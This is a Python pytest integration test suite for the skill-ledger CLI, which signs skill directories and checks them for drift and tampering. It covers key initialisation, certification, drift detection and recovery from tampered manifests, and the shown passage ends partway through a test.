#!/usr/bin/env python3
"""Integration tests for the ``skill-ledger`` CLI (source-tree / dev mode).

Exercises every subcommand **in-process** via Typer ``CliRunner``, verifying
**JSON stdout**, **exit codes**, and **filesystem side effects**.

Running in-process (instead of via subprocess) means ``pytest-cov`` can track
coverage of the CLI source code automatically.

This file requires the source tree — it is *not* for RPM-installed
environments.  See ``tests/e2e/skill-ledger/e2e_test.py`` for the RPM
binary end-to-end test suite.

All key material and config files are isolated via ``XDG_DATA_HOME`` and
``XDG_CONFIG_HOME`` environment variables so the host keyring is never touched.

Prerequisites: Python 3.11, source tree
"""

import hashlib
import json
import os
import re
import shutil
import tempfile
import types
from dataclasses import dataclass
from pathlib import Path

import agent_sec_cli.security_events as security_events
import pytest
from agent_sec_cli.cli import app as cli_app
from agent_sec_cli.daemon.handlers.security_query import (
    security_events_list_handler,
    security_summary_handler,
)
from agent_sec_cli.daemon.protocol import DaemonRequest
from agent_sec_cli.daemon.runtime import DaemonRuntime
from agent_sec_cli.security_events.sqlite_reader import SqliteEventReader
from agent_sec_cli.security_middleware.result import ActionResult
from agent_sec_cli.skill_ledger import cli as skill_ledger_cli
from agent_sec_cli.skill_ledger import config as config_module
from agent_sec_cli.skill_ledger.core import decision as decision_core
from agent_sec_cli.skill_ledger.core import live_root as live_root_core
from agent_sec_cli.skill_ledger.core import resolver as resolver_core
from agent_sec_cli.skill_ledger.core.certifier import (
    _persist_manifest_update,
    _prepare_manifest_for_update,
)
from agent_sec_cli.skill_ledger.core.file_hasher import compute_file_hashes
from agent_sec_cli.skill_ledger.core.live_root import ResolvedSkillRoot
from agent_sec_cli.skill_ledger.core.resolver import resolve_activation
from agent_sec_cli.skill_ledger.errors import KeyNotFoundError
from agent_sec_cli.skill_ledger.signing.base import SigningBackend
from agent_sec_cli.skill_ledger.signing.ed25519 import NativeEd25519Backend
from typer.testing import CliRunner

# ── Helpers ────────────────────────────────────────────────────────────────

_runner = CliRunner()
_ANSI_RE = re.compile(r"\x1b\[[0-?]*[ -/]*[@-~]")
PENDING_DECISION_TARGET = ".skill-meta/versions/__pending_decision__.snapshot"


def strip_ansi(text: str) -> str:
    """Remove Rich/Typer styling escapes from help output before assertions."""
    return _ANSI_RE.sub("", text)


@dataclass
class _CliResult:
    """Compatibility wrapper mapping CliRunner result to subprocess-like interface."""

    returncode: int
    stdout: str
    stderr: str


def run_skill_ledger(
    args: list[str],
    env_extra: dict | None = None,
) -> _CliResult:
    """Run ``agent-sec-cli skill-ledger <args>`` in-process via Typer CliRunner.

    The *env_extra* dict is merged into ``os.environ`` for the duration of the
    invocation and automatically restored afterwards (handled by CliRunner).
    """
    result = _runner.invoke(cli_app, ["skill-ledger"] + args, env=env_extra)
    return _CliResult(
        returncode=result.exit_code,
        stdout=result.stdout,
        stderr=result.stderr,
    )


def parse_json_output(stdout: str) -> dict:
    """Parse the first JSON line from CLI stdout."""
    for line in stdout.strip().splitlines():
        line = line.strip()
        if line.startswith("{") or line.startswith("["):
            return json.loads(line)
    raise ValueError(f"No JSON found in stdout:\n{stdout}")


def reset_security_event_writers() -> None:
    """Reset in-process security-event singletons so env path overrides apply."""
    sqlite_writer = getattr(security_events, "_sqlite_writer", None)
    if sqlite_writer is not None:
        sqlite_writer.close()
    security_events._writer = None
    security_events._sqlite_writer = None
    security_events._reader = None


def read_security_events(data_dir: Path) -> list[dict]:
    """Read security-events JSONL records from an isolated test data dir."""
    log_path = data_dir / "security-events.jsonl"
    if not log_path.exists():
        return []
    return [json.loads(line) for line in log_path.read_text().splitlines() if line]


def make_skill(parent: Path, name: str, files: dict[str, str]) -> Path:
    """Create a fake skill directory with the given files.

    Automatically adds a minimal ``SKILL.md`` if not provided, so that
    ``validate_skill_dir()`` passes.
    """
    if "SKILL.md" not in files:
        files = {
            "SKILL.md": (
                f"---\nname: {name}\ndescription: Test skill\n---\n# {name}\n"
            ),
            **files,
        }
    skill_dir = parent / name
    for rel, content in files.items():
        p = skill_dir / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(content)
    return skill_dir


def write_findings_file(parent: Path, name: str, findings: list | dict) -> Path:
    """Write a findings JSON file and return its path."""
    path = parent / name
    path.write_text(json.dumps(findings, ensure_ascii=False))
    return path


def snapshot_file_tree(root: Path) -> dict[str, bytes]:
    """Return relative paths and contents for every file below *root*."""
    if not root.is_dir():
        return {}
    return {
        path.relative_to(root).as_posix(): path.read_bytes()
        for path in sorted(root.rglob("*"))
        if path.is_file()
    }


def read_latest_manifest(skill_dir: Path) -> dict:
    """Read ``.skill-meta/latest.json`` for assertions."""
    latest = skill_dir / ".skill-meta" / "latest.json"
    return json.loads(latest.read_text())


def read_activation(skill_dir: Path) -> dict:
    """Read ``.skill-meta/activation.json`` for assertions."""
    activation = skill_dir / ".skill-meta" / "activation.json"
    return json.loads(activation.read_text())


def write_skill_ledger_config(root: Path, config: dict) -> None:
    """Write isolated skill-ledger config for integration tests."""
    config_dir = root / "xdg_config" / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True, exist_ok=True)
    (config_dir / "config.json").write_text(json.dumps(config))


def decode_xattr_activation(value: bytes) -> dict:
    """Decode an activation xattr payload."""
    return json.loads(value.decode("utf-8"))


def assert_pending_stub(
    skill_dir: Path, *, leaked_files: list[str] | None = None
) -> None:
    """Assert the pending decision stub exists without exposing live risk files."""
    stub_dir = skill_dir / PENDING_DECISION_TARGET
    assert stub_dir.is_dir()
    skill_md = stub_dir / "SKILL.md"
    assert skill_md.is_file()
    content = skill_md.read_text()
    assert f"name: {skill_dir.name}" in content
    assert "requires manual review" in content
    assert "skill-ledger decide" in content
    for rel in leaked_files or []:
        assert not (stub_dir / rel).exists()


def make_fuse_view_from_snapshot(
    backing_skill: Path, parent: Path, version: str
) -> Path:
    """Create a FUSE-like skill view with live metadata and snapshot files."""
    view = parent / backing_skill.name
    if view.exists():
        shutil.rmtree(view)
    snapshot = backing_skill / ".skill-meta" / "versions" / f"{version}.snapshot"
    shutil.copytree(snapshot, view)
    (view / ".skill-meta").symlink_to(backing_skill / ".skill-meta")
    return view


def resolve_skill_activation(
    skill_dir: Path,
    env_extra: dict,
    *,
    policy: str = "pass_warn_only",
) -> dict:
    """Resolve activation using the same isolated env as CLI integration tests."""
    return resolve_skill_activation_with_backend(
        skill_dir,
        env_extra,
        NativeEd25519Backend(),
        policy=policy,
    )


def resolve_skill_activation_with_backend(
    skill_dir: Path,
    env_extra: dict,
    backend: SigningBackend,
    *,
    policy: str = "pass_warn_only",
) -> dict:
    """Resolve activation with a caller-provided signing backend."""
    previous = {key: os.environ.get(key) for key in env_extra}
    os.environ.update(env_extra)
    try:
        return resolve_activation(str(skill_dir), backend, policy=policy)
    finally:
        for key, value in previous.items():
            if value is None:
                os.environ.pop(key, None)
            else:
                os.environ[key] = value


class _VerifyFalseBackend(NativeEd25519Backend):
    """Backend test double whose verify method returns ``False``."""

    def verify(self, data: bytes, signature_b64: str, fingerprint: str) -> bool:
        return False


class _KeyMissingBackend(NativeEd25519Backend):
    """Backend test double whose verify method raises missing-key errors."""

    def verify(self, data: bytes, signature_b64: str, fingerprint: str) -> bool:
        raise KeyNotFoundError("/tmp/missing-test-key.pub")


# ── Workspace ──────────────────────────────────────────────────────────────


class Workspace:
    """Shared test workspace: isolated XDG dirs, skills dir."""

    def __init__(self):
        self.root = Path(tempfile.mkdtemp(prefix="e2e_skill_ledger_"))
        self.xdg_data = self.root / "xdg_data"
        self.xdg_config = self.root / "xdg_config"
        self.xdg_data.mkdir()
        self.xdg_config.mkdir()
        self.skills_dir = self.root / "skills"
        self.skills_dir.mkdir()
        self.fixtures = self.root / "fixtures"
        self.fixtures.mkdir()

    def env(self, extra: dict | None = None) -> dict:
        """Return env dict with XDG isolation (for subprocess)."""
        e = {
            "XDG_DATA_HOME": str(self.xdg_data),
            "XDG_CONFIG_HOME": str(self.xdg_config),
        }
        if extra:
            e.update(extra)
        return e

    def cleanup(self):
        shutil.rmtree(self.root, ignore_errors=True)


@pytest.fixture(scope="session")
def ws():
    """Session-wide isolated workspace with keys already initialized."""
    workspace = Workspace()
    r = run_skill_ledger(["init", "--no-baseline"], env_extra=workspace.env())
    assert r.returncode == 0, f"Workspace fixture init --no-baseline failed: {r.stderr}"
    yield workspace
    workspace.cleanup()


# ── Group 1: init --no-baseline ─────────────────────────────────────────────────────


def test_init_no_passphrase(ws):
    """init --no-baseline without passphrase → exit 0, encrypted: false."""
    alt_data = ws.root / "nopass_data"
    alt_data.mkdir()
    env = ws.env({"XDG_DATA_HOME": str(alt_data)})
    r = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)["key"]
    assert out.get("encrypted") is False, f"expected encrypted=false, got {out}"
    assert out.get("fingerprint", "").startswith("sha256:"), f"bad fingerprint: {out}"


def test_init_json_structure(ws):
    """JSON output must contain all 4 expected fields."""
    alt_data = ws.root / "json_struct_data"
    alt_data.mkdir()
    env = ws.env({"XDG_DATA_HOME": str(alt_data)})
    r = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)["key"]
    for key in ("fingerprint", "publicKeyPath", "privateKeyPath", "encrypted"):
        assert key in out, f"Missing field '{key}' in output: {out}"
    assert len(out["fingerprint"]) > 10
    assert len(out["publicKeyPath"]) > 0
    assert len(out["privateKeyPath"]) > 0


def test_init_reuses_existing_keys(ws):
    """Repeated initialization reuses existing key material."""
    # Generate fresh keys in a separate XDG
    alt_data = ws.root / "alt_data"
    alt_data.mkdir()
    env = ws.env({"XDG_DATA_HOME": str(alt_data)})
    r1 = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r1.returncode == 0, f"first init failed: {r1.stderr}"

    before = snapshot_file_tree(alt_data / "agent-sec" / "skill-ledger")
    r2 = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r2.returncode == 0, r2.stderr
    repeated = parse_json_output(r2.stdout)
    assert repeated["keyCreated"] is False
    assert repeated["key"] is None
    assert snapshot_file_tree(alt_data / "agent-sec" / "skill-ledger") == before


def test_init_force_overwrite(ws):
    """--force overwrites existing keys and produces a new fingerprint."""
    alt_data = ws.root / "force_data"
    alt_data.mkdir()
    env = ws.env({"XDG_DATA_HOME": str(alt_data)})
    r1 = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r1.returncode == 0
    fp1 = parse_json_output(r1.stdout)["key"]["fingerprint"]

    r2 = run_skill_ledger(["init", "--no-baseline", "--force-keys"], env_extra=env)
    assert r2.returncode == 0, f"exit {r2.returncode}: {r2.stderr}"
    fp2 = parse_json_output(r2.stdout)["key"]["fingerprint"]

    # New key pair → almost certainly different fingerprint
    assert fp1 != fp2, f"Fingerprint should change after --force: {fp1}"


def test_init_with_passphrase_env(ws):
    """SKILL_LEDGER_PASSPHRASE env var → encrypted: true."""
    alt_data = ws.root / "pass_data"
    alt_data.mkdir()
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "SKILL_LEDGER_PASSPHRASE": "test-passphrase-123",
        }
    )
    r = run_skill_ledger(["init", "--no-baseline", "--passphrase"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)["key"]
    assert out.get("encrypted") is True, f"expected encrypted=true, got {out}"


def test_init_passphrase_existing_key_requires_force_keys(ws):
    """init --passphrase must not silently ignore an existing key."""
    alt_data = ws.root / "init_existing_passphrase_data"
    alt_data.mkdir()
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "SKILL_LEDGER_PASSPHRASE": "test-passphrase-123",
        }
    )
    r1 = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r1.returncode == 0, f"initial key setup failed: {r1.stderr}"

    r2 = run_skill_ledger(["init", "--no-baseline", "--passphrase"], env_extra=env)
    assert r2.returncode != 0, "Expected init --passphrase to reject existing keys"
    assert "init --force-keys --passphrase" in (r2.stdout + r2.stderr)


def test_init_passphrase_is_redacted_from_security_event(ws):
    """Security event request details must not persist key passphrases."""
    alt_data = ws.root / "init_passphrase_redacted_data"
    event_data = ws.root / "events_init_passphrase_redacted"
    alt_data.mkdir()
    event_data.mkdir()
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "AGENT_SEC_DATA_DIR": str(event_data),
            "SKILL_LEDGER_PASSPHRASE": "test-passphrase-123",
        }
    )
    reset_security_event_writers()

    r = run_skill_ledger(["init", "--no-baseline", "--passphrase"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["key"]["encrypted"] is True

    events = read_security_events(event_data)
    reset_security_event_writers()
    init_event = next(
        event for event in events if event["details"]["result"].get("command") == "init"
    )
    request = init_event["details"]["request"]
    assert request["passphrase"] == "[REDACTED]"
    assert "test-passphrase-123" not in json.dumps(init_event)


def test_init_force_key_archive_error_has_context(ws, monkeypatch):
    """Key rotation errors include context about archiving the old public key."""
    alt_data = ws.root / "init_force_archive_error_data"
    alt_data.mkdir()
    env = ws.env({"XDG_DATA_HOME": str(alt_data)})
    r1 = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r1.returncode == 0, f"initial key setup failed: {r1.stderr}"

    def fail_archive():
        raise OSError("copy failed")

    monkeypatch.setattr(
        "agent_sec_cli.security_middleware.backends.skill_ledger.archive_current_public_key",
        fail_archive,
    )
    r2 = run_skill_ledger(["init", "--no-baseline", "--force-keys"], env_extra=env)
    assert r2.returncode != 0
    combined = r2.stdout + r2.stderr
    assert "failed to archive existing public key before rotation" in combined
    assert "copy failed" in combined


def test_init_no_baseline_creates_keys_only(ws):
    """init --no-baseline initializes keys without writing skill manifests."""
    alt_data = ws.root / "init_nobase_data"
    alt_config = ws.root / "init_nobase_config"
    alt_data.mkdir()
    alt_config.mkdir()
    skill = make_skill(ws.skills_dir, "init-no-baseline", {"a.txt": "a"})
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "XDG_CONFIG_HOME": str(alt_config),
        }
    )

    r = run_skill_ledger(["init", "--no-baseline"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["keyCreated"] is True
    assert out["baseline"] is False
    assert not (skill / ".skill-meta" / "latest.json").exists()


def test_init_default_baselines_managed_skills(ws):
    """init discovers managed skills and creates a signed quick-scan baseline."""
    alt_data = ws.root / "init_base_data"
    alt_config = ws.root / "init_base_config"
    alt_data.mkdir()
    alt_config.mkdir()
    root = ws.root / "init_baseline_skills"
    root.mkdir()
    skill = make_skill(root, "init-baselined", {"a.txt": "a"})
    config_dir = alt_config / "agent-sec" / "skill-ledger"
    config_dir.mkdir(parents=True)
    (config_dir / "config.json").write_text(
        json.dumps(
            {
                "enableDefaultSkillDirs": False,
                "managedSkillDirs": [str(root / "*")],
            }
        )
    )
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "XDG_CONFIG_HOME": str(alt_config),
        }
    )

    r = run_skill_ledger(["init"], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["keyCreated"] is True
    assert out["baseline"] is True
    assert len(out["results"]) == 1

    manifest = read_latest_manifest(skill)
    assert {entry["scanner"] for entry in manifest["scans"]} == {
        "code-scanner",
        "static-scanner",
    }
    assert manifest["signature"] is not None


def test_scan_auto_key_creation_warns_unencrypted(ws):
    """scan self-initializes keys but warns when the default key is unencrypted."""
    alt_data = ws.root / "scan_auto_key_data"
    alt_config = ws.root / "scan_auto_key_config"
    alt_data.mkdir()
    alt_config.mkdir()
    skill = make_skill(ws.skills_dir, "scan-auto-key-warning", {"main.py": "# ok\n"})
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "XDG_CONFIG_HOME": str(alt_config),
        }
    )

    r = run_skill_ledger(["scan", str(skill)], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["keyCreated"] is True
    assert out["warnings"]
    assert "created an unencrypted Skill Ledger signing key" in r.stderr


def test_certify_auto_key_creation_warns_unencrypted(ws):
    """certify self-initializes keys but warns when the default key is unencrypted."""
    alt_data = ws.root / "certify_auto_key_data"
    alt_config = ws.root / "certify_auto_key_config"
    alt_data.mkdir()
    alt_config.mkdir()
    skill = make_skill(ws.skills_dir, "certify-auto-key-warning", {"main.py": "# ok\n"})
    findings = write_findings_file(
        ws.fixtures,
        "certify-auto-key-warning.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    env = ws.env(
        {
            "XDG_DATA_HOME": str(alt_data),
            "XDG_CONFIG_HOME": str(alt_config),
        }
    )

    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["keyCreated"] is True
    assert out["warnings"]
    assert "created an unencrypted Skill Ledger signing key" in r.stderr


# ── Group 2: Happy path lifecycle ──────────────────────────────────────────


def test_full_lifecycle_pass(ws):
    """init --no-baseline → check (none/read-only) → certify --findings (pass) → check (pass) → audit."""
    skill = make_skill(
        ws.skills_dir,
        "lifecycle-pass",
        {
            "main.py": "print('hello')\n",
            "README.md": "# Test\n",
        },
    )
    env = ws.env()

    # check → status=none without creating a version
    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0, f"check exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "none", f"expected none, got {out}"
    assert not (skill / ".skill-meta" / "latest.json").exists()

    # certify with pass findings
    findings = write_findings_file(
        ws.fixtures,
        "pass.json",
        [
            {"rule": "no-sudo", "level": "pass", "message": "No sudo found"},
        ],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"certify exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "pass", f"expected pass, got {out}"

    # check → pass
    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0, f"check exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "pass", f"expected pass, got {out}"

    # audit → valid
    r = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert r.returncode == 0, f"audit exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["valid"] is True, f"expected valid=true, got {out}"


def test_multi_version_lifecycle(ws):
    """certify → modify file → certify → audit validates 2-version chain."""
    skill = make_skill(ws.skills_dir, "multi-ver", {"data.txt": "v1"})
    env = ws.env()

    # First certify
    findings = write_findings_file(
        ws.fixtures,
        "mv-pass.json",
        [
            {"rule": "safe", "level": "pass", "message": "OK"},
        ],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"certify1 exit {r.returncode}: {r.stderr}"
    out1 = parse_json_output(r.stdout)
    assert out1["newVersion"] is True

    # Modify file → new version
    (skill / "data.txt").write_text("v2")
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"certify2 exit {r.returncode}: {r.stderr}"
    out2 = parse_json_output(r.stdout)
    assert out2["newVersion"] is True
    assert out2["versionId"] != out1["versionId"], "Expected different versionId"

    # audit → valid, 2 versions
    r = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["valid"] is True
    assert out["versions_checked"] == 2, f"expected 2, got {out['versions_checked']}"


def test_lifecycle_with_warn_findings(ws):
    """certify with warn findings → check returns warn, exit 0."""
    skill = make_skill(ws.skills_dir, "lifecycle-warn", {"app.sh": "#!/bin/bash\n"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "warn.json",
        [
            {
                "rule": "shell-warning",
                "level": "warn",
                "message": "Script lacks set -e",
            },
            {"rule": "no-sudo", "level": "pass", "message": "No sudo found"},
        ],
    )
    r = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)],
        env_extra=env,
    )
    assert r.returncode == 0, f"certify exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["scanStatus"] == "warn", f"expected warn, got {out}"

    # check → warn (exit 0 — warn does NOT block)
    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0, f"check should exit 0 for warn: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "warn"


# ── Group 3: check state machine ──────────────────────────────────────────


def test_check_no_manifest_is_read_only(ws):
    """First check on new skill returns status=none without creating metadata."""
    skill = make_skill(ws.skills_dir, "check-new", {"f.txt": "hello"})
    env = ws.env()

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["status"] == "none"
    assert out["versionId"] is None
    assert out["fileCount"] is None
    assert not (skill / ".skill-meta" / "latest.json").exists()
    assert not (skill / ".skill-meta" / "versions").exists()


def test_check_after_file_add_drifted(ws):
    """Adding a file after certify → status=drifted."""
    skill = make_skill(ws.skills_dir, "check-add", {"original.txt": "content"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "add-pass.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Add a new file
    (skill / "new_file.txt").write_text("I am new")

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0, f"exit {r.returncode}: {r.stderr}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "drifted", f"expected drifted, got {out}"
    assert "new_file.txt" in out.get("added", [])


def test_check_after_file_modify_drifted(ws):
    """Modifying a file after certify → status=drifted."""
    skill = make_skill(ws.skills_dir, "check-modify", {"data.txt": "original"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "mod-pass.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Modify existing file
    (skill / "data.txt").write_text("CHANGED")

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["status"] == "drifted"
    assert "data.txt" in out.get("modified", [])


def test_check_after_file_remove_drifted(ws):
    """Removing a file after certify → status=drifted."""
    skill = make_skill(
        ws.skills_dir,
        "check-remove",
        {
            "keep.txt": "keep",
            "delete_me.txt": "gone",
        },
    )
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "rm-pass.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Remove a file
    (skill / "delete_me.txt").unlink()

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 0
    out = parse_json_output(r.stdout)
    assert out["status"] == "drifted"
    assert "delete_me.txt" in out.get("removed", [])


def test_check_tampered_manifest_hash(ws):
    """Tampering wins over simultaneous live-tree drift."""
    skill = make_skill(ws.skills_dir, "check-tamper", {"f.txt": "safe"})
    env = ws.env()

    findings = write_findings_file(
        ws.fixtures,
        "tamper-pass.json",
        [
            {"rule": "ok", "level": "pass", "message": "pass"},
        ],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    # Tamper: modify a field in latest.json without re-hashing
    latest = skill / ".skill-meta" / "latest.json"
    data = json.loads(latest.read_text())
    data["scanStatus"] = "deny"  # tamper without re-hashing
    data["userDecision"] = {
        "action": "always_allow",
        "reason": "attacker-controlled",
    }
    latest.write_text(json.dumps(data))
    (skill / "f.txt").write_text("changed")

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 1, f"expected exit 1 for tampered, got {r.returncode}"
    out = parse_json_output(r.stdout)
    assert out["status"] == "tampered", f"expected tampered, got {out}"
    for field in (
        "versionId",
        "createdAt",
        "updatedAt",
        "fileCount",
        "manifestHash",
        "userDecision",
    ):
        assert out[field] is None
    assert "added" not in out
    assert "removed" not in out
    assert "modified" not in out


def test_check_tampered_writes_security_event(ws):
    """Tampered checks remain visible through the sec-core event log."""
    skill = make_skill(ws.skills_dir, "check-tamper-event", {"f.txt": "safe"})
    event_data = ws.root / "events_check_tamper"
    event_data.mkdir()
    env = ws.env({"AGENT_SEC_DATA_DIR": str(event_data)})
    reset_security_event_writers()

    findings = write_findings_file(
        ws.fixtures,
        "tamper-event-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )

    latest = skill / ".skill-meta" / "latest.json"
    data = json.loads(latest.read_text())
    data["scanStatus"] = "deny"
    latest.write_text(json.dumps(data))

    r = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert r.returncode == 1
    out = parse_json_output(r.stdout)
    events = read_security_events(event_data)
    reset_security_event_writers()
    check_event = next(
        event
        for event in events
        if event["category"] == "skill_ledger"
        and event["details"]["result"].get("command") == "check"
    )
    event_result = check_event["details"]["result"]
    assert event_result["status"] == "tampered"
    assert event_result["skill_name"] == out["skillName"]
    assert event_result["version_id"] == out["versionId"]


def test_scan_recovers_tampered_latest_with_audit_event_and_valid_chain(ws):
    """scan records tampered recovery in event details without changing manifest schema."""
    skill = make_skill(ws.skills_dir, "scan-tamper-recover", {"main.py": "# ok\n"})
    event_data = ws.root / "events_scan_tamper_recover"
    event_data.mkdir()
    env = ws.env({"AGENT_SEC_DATA_DIR": str(event_data)})
    reset_security_event_writers()

    findings = write_findings_file(
        ws.fixtures,
        "scan-tamper-recover-pass.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    r1 = run_skill_ledger(
        ["certify", str(skill), "--findings", str(findings)], env_extra=env
    )
    assert r1.returncode == 0, f"initial certify failed: {r1.stderr}"

    latest = skill / ".skill-meta" / "latest.json"
    data = json.loads(latest.read_text())
    trusted_v1 = read_latest_manifest(skill)
    data["userDecision"] = {
        "action": "always_allow",
        "reason": "forged allow",
    }
    data["scans"] = [
        {
            "scanner": "forged-scanner",
            "version": "attacker",
            "status": "pass",
            "findings": [],
            "scannedAt": "attacker-time",
        }
    ]
    data["scanStatus"] = "pass"
    latest.write_text(json.dumps(data))
    (skill / "main.py").write_text("# changed\n")

    r2 = run_skill_ledger(
        ["scan", str(skill), "--scanners", "code-scanner"], env_extra=env
    )
    assert r2.returncode == 0, f"scan recovery failed: {r2.stderr}"
    out = parse_json_output(r2.stdout)
    event = out["auditEvents"][0]
    assert event["type"] == "tampered_recovered"
    assert event["operation"] == "scan"
    assert event["fromStatus"] == "tampered"
    assert event["toStatus"] == out["scanStatus"]
    assert event["versionId"] == out["versionId"]
    recovered = read_latest_manifest(skill)
    assert recovered["versionId"] == "v000002"
    assert recovered["previousVersionId"] == "v000001"
    assert recovered["previousManifestSignature"] == trusted_v1["signature"]["value"]
    assert recovered["userDecision"] is None
    assert "forged-scanner" not in {scan["scanner"] for scan in recovered["scans"]}
    assert "auditEvents" not in recovered

    audit_result = run_skill_ledger(["audit", str(skill)], env_extra=env)
    assert audit_result.returncode == 0, audit_result.stderr
    assert parse_json_output(audit_result.stdout)["valid"] is True

    events = read_security_events(event_data)
    reset_security_event_writers()
    scan_event_result = next(
        event["details"]["result"]
        for event in events
        if event["details"]["result"].get("command") == "scan"
        and event["details"]["result"].get("audit_events", [{}])[0].get("type")
        == "tampered_recovered"
    )
    assert scan_event_result["verdict"] == out["scanStatus"]
    assert scan_event_result["version_id"] == out["versionId"]
    assert scan_event_result["audit_events"][0]["to_status"] == out["scanStatus"]


def test_certify_recovers_missing_latest_with_audit_event(ws):
    """certify treats a missing latest with history as tampered recovery."""
    skill = make_skill(ws.skills_dir, "certify-missing-latest", {"main.py": "# ok\n"})
    event_data = ws.root / "events_certify_missing_latest"
    event_data.mkdir()
    env = ws.env({"AGENT_SEC_DATA_DIR": str(event_data)})
    reset_security_event_writers()

    first_findings = write_findings_file(
        ws.fixtures,
        "certify-missing-latest-first.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    r1 = run_skill_ledger(
        ["certify", str(skill), "--findings", str(first_findings)], env_extra=env
    )
    assert r1.returncode == 0, f"initial certify failed: {r1.stderr}"

    latest = skill / ".skill-meta" / "latest.json"
    trusted_v1 = read_latest_manifest(skill)
    latest.unlink()

    checked = run_skill_ledger(["check", str(skill)], env_extra=env)
    assert checked.returncode == 1
    checked_out = parse_json_output(checked.stdout)
    assert checked_out["status"] == "tampered"
    assert (
        checked_out["reason"] == "latest.json is missing while version artifacts exist"
    )

    second_findings = write_findings_file(
        ws.fixtures,
        "certify-missing-latest-second.json",
        [{"rule": "ok", "level": "pass", "message": "pass"}],
    )
    r2 = run_skill_ledger(
        ["certify", str(skill), "--findings", str(second_findings)], env_extra=env
    )
    assert r2.returncode == 0, f"certify recovery failed: {r2.stderr}"
    out = parse_json_output(r2.stdout)
    event = out["auditEvents"][0]
    assert event["type"] == "tampered_recovered"
    assert event["operation"] == "certify"
    assert event["fromStatus"] == "tampered"
    assert event["toStatus"] == out["scanStatus"]
    recovered = read_latest_manifest(skill)
    assert recovered["versionId"] == "v000002"
    assert recovered["previousVersionId"] == "v000001"
    assert recovered["previousManifestSignature"] == trusted_v1["signature"]["value"]

    audit_result = run_skill_ledger(["audit", str(skill)], env_extra=env)
